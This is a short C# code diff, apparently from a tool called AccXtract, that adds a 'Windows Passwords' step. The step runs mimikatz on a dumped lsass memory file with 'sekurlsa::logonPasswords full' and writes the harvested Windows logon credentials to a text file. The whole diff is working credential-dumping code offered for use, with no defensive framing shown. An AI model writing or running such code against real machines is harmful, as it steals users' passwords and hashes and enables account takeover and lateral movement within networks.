@@ -472,6 +472,21 @@ Path=Profiles/AccXtract." + profileName);
             }
             #endregion
 
+            #region Windows Passwords
+            if (File.Exists(Directory.GetCurrentDirectory() + "\\Tools\\mimikatz.exe"))
+            {
+                ProcessStartInfo inf = new ProcessStartInfo();
+                inf.UseShellExecute = false;
+                inf.RedirectStandardOutput = true;
+                inf.FileName = Directory.GetCurrentDirectory() + "\\Tools\\mimikatz.exe";
+                inf.Arguments = @"""sekurlsa::minidump " + AccXtractFolder + "\\" + computerName + "\\Windows\\lsass.dmp\"" +@" ""sekurlsa::logonPasswords full""" + " exit";
+                Process proc = Process.Start(inf);
+                StreamWriter output = new StreamWriter(AccXtractFolder + "\\" + computerName + "\\Windows\\lsass.txt");
+                output.Write(proc.StandardOutput.ReadToEnd());
+                output.Close();
+            }
+            #endregion
+
             return newGroup;
         }
 
